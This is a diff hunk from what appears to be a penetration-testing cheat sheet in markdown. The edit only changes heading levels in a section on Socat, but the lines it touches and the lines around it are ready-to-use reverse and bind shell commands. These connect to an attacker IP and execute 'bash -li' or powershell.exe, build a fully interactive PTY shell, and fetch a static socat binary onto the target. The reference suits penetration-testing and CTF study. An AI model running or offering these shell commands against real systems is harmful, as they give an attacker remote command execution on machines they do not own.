@@ -468,21 +468,22 @@ On reverse/bind shell:
     stty rows <number>
     stty cols <number>
 ## Socat
-### Listen from attacking device (basic shell)
+### Basic shell
+#### Listen from attacking device (basic shell)
     socat TCP-L:<port> - (reverse)
     socat TCP:<TARGET-IP>:<TARGET-PORT> - (bind)
-### Send a shell from target device (basic shell)
+#### Send a shell from target device (basic shell)
     socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes (reverse Windows)
     socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li" (reverse Linux)
     socat TCP-L:<PORT> EXEC:"bash -li" (bind Linux)
     socat TCP-L:<PORT> EXEC:powershell.exe,pipes (bind Windows)   
-### Listen from attacking device (very stable shell)
+#### Listen from attacking device (very stable shell)
     socat TCP-L:<port> FILE:`tty`,raw,echo=0  
-### Send a shell from target LINUX device (very stable shell)
+#### Send a shell from target LINUX device (very stable shell)
 First download: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true on the target machine, then: <br>
     
     socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
-### Add verbosity
+#### Add verbosity
     -d -d (in the command)
 ### Encrypted shell
 #### Generate certificate:
